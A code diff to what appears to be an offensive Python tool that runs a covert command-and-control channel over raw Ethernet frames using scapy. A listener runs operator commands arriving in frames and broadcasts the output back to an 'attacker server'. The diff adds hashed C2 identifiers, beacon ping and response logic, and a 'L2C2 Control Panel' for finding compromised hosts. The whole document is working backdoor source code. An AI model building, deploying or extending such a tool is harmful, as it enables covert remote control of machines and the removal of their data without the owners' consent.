@@ -1,6 +1,7 @@
 import argparse, threading, time
+import hashlib
 from scapy.all import sniff, Ether, sendp
-import subprocess
+import subprocess, os
 
 mac_address = "FF:FF:FF:FF:FF:FF" # default return address is broadcast
 frame_size  = 1000 # Default frame size is 1500, but if jumbo frames are supported on the network
@@ -9,7 +10,17 @@ frame_size  = 1000 # Default frame size is 1500, but if jumbo frames are support
 frame_delay = 0.5      # For chunked responses, could help by spacing out frames
 session_id  = "123456" # Id for accessing the session
 attacker_id = "zxczxc" # Id for returning information to the attacker server
-                  
+
+# Create a hash for C2L2 server
+c2_id = hashlib.sha3_256()
+c2_id.update(b"Unique_C2_Id_Should_Be_Used")
+c2_id = c2_id.hexdigest()
+
+# Create hash of hash
+c2_id_r = hashlib.sha3_256()
+c2_id_r.update(c2_id.encode('utf-8'))
+c2_id_r = c2_id_r.hexdigest()
+                 
 def send_frame(message, mac_address):
     # Next send the output back to the command server
     frames = [message[i:i+frame_size] for i in range(0, len(message), frame_size)]
@@ -19,7 +30,8 @@ def send_frame(message, mac_address):
         eth_frame = Ether(dst=mac_address) / frame
         
         # Send the Ethernet frame
-        sendp(eth_frame)
+        with open(os.devnull, 'w') as f:
+            sendp(eth_frame, verbose=False)
 
 # Define a callback function to handle each packet
 def process_frame(frame):
@@ -48,6 +60,11 @@ def process_frame(frame):
                     
                 # Next send the output back to the command server
                 send_frame(noutput.encode('utf-8'), "FF:FF:FF:FF:FF:FF")
+                
+            if c2_id.encode("utf-8") in eth_frame.payload.original: # Respond to c2 ping
+                # Send frame of c2_id hashed again
+                print("pong")
+                send_frame(c2_id_r.encode('utf-8'), "FF:FF:FF:FF:FF:FF")             
 
 
 # This method is the listening server for the attacker host.
@@ -59,6 +76,10 @@ def process_return_frame(frame):
             if len(eth_frame.payload) > 0:
                 
                 index = str(eth_frame.payload.original).find(attacker_id)
+                if c2_id_r.encode("utf-8") in eth_frame.payload.original:
+                    print("Beacon: " + "[" + eth_frame.src + "]")
+                    index = 1
+                    
                 if index != -1:
                     #print("Source MAC:", eth_frame.src)
                     #print("Destination MAC:", eth_frame.dst)
@@ -67,7 +88,7 @@ def process_return_frame(frame):
                     string = string.replace("'", "")
                     pad = "\\x00" # Gets rid of padding
                     returnc = "\\r" # Gets rid of return carriage
-                    #nstring = string.replace(attacker_id, '')
+                    nstring = string.replace(attacker_id, '')
                     
                     nstring = string.replace(returnc, '')
                     nstring = nstring.replace(pad, '')
@@ -80,6 +101,32 @@ def process_return_frame(frame):
                     
                     print("" + session_id + ">", end='')
                     
+                    
+def ControlPanel(userin):
+    if "enable options" in userin:
+        
+        while userin != "disable options" or userin != "3":
+            print("L2C2 Control Panel: \n")
+            print("1) ping beacons")
+            print("2) help")
+            print("3) disable options")
+            print(">", end='')
+            userin = input()
+            
+            if userin == "1":
+                print("Pinging Beacons: \n")
+                send_frame(c2_id.encode('utf-8'), "FF:FF:FF:FF:FF:FF")
+                time.sleep(3) # Wait some time for beacons to call home
+                
+            elif userin == "2":
+                print("Select one of the options to configure a beacon, or exit by entering 'disable options'\n")
+            
+            elif userin == "3":
+                userin = "disable options"
+                print()
+                break
+                
+            userin = ""
 
 # Sniff Ethernet frames and call the process_packet function for each packet
 def listen():
@@ -106,11 +153,15 @@ def connect():
         userin += str(input())
                  
         # Make sure the input isn't larger than the set amount
+        
         if len(userin) > frame_size:
             print("Error: Input too large...")
         
-        if userin != session_id:
+        ControlPanel(userin)
+        
+        if userin != session_id and "enable options" not in userin:
             send_frame(userin.encode('utf-8'), mac_address)
+            
         else:
             print("" + session_id + ">", end='')
         
